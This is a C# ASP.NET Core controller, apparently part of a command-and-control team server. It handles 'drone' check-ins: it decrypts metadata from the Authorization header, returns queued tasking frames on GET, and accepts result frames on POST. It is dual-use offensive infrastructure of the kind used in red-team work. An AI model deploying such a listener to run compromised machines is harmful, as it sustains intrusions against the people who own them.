using Microsoft.AspNetCore.Mvc;

using TeamServer.Drones;
using TeamServer.Interfaces;
using TeamServer.Messages;
using TeamServer.Utilities;

namespace TeamServer.Handlers;

public class HttpHandlerController : ControllerBase
{
    private readonly ICryptoService _crypto;
    private readonly IServerService _server;
    private readonly IEventService _events;

    public HttpHandlerController(ICryptoService crypto, IServerService server, IEventService events)
    {
        _crypto = crypto;
        _server = server;
        _events = events;
    }

    public async Task<IActionResult> RouteDrone()
    {
        if (HttpContext.Request.Method.Equals("GET", StringComparison.OrdinalIgnoreCase))
        {
            // recover metadata from header
            if (!HttpContext.Request.Headers.TryGetValue("Authorization", out var header))
                return NotFound();

            var raw = Convert.FromBase64String(header.First().Remove(0, 7));
            var metadata = await _crypto.Decrypt<Metadata>(raw);
            
            // send outbound frames
            var outbound = await _server.GetOutboundFrames(metadata);
            return new FileContentResult(outbound.Serialize(), "application/octet-stream");
        }
        
        if (HttpContext.Request.Method.Equals("POST", StringComparison.OrdinalIgnoreCase))
        {
            // read body
            using var ms = new MemoryStream();
            await HttpContext.Request.Body.CopyToAsync(ms);
            
            // recover frames
            var inbound = ms.ToArray().Deserialize<IEnumerable<C2Frame>>();
            await _server.HandleInboundMessages(inbound);

            return NoContent();
        }

        // catch all
        return BadRequest();
    }
}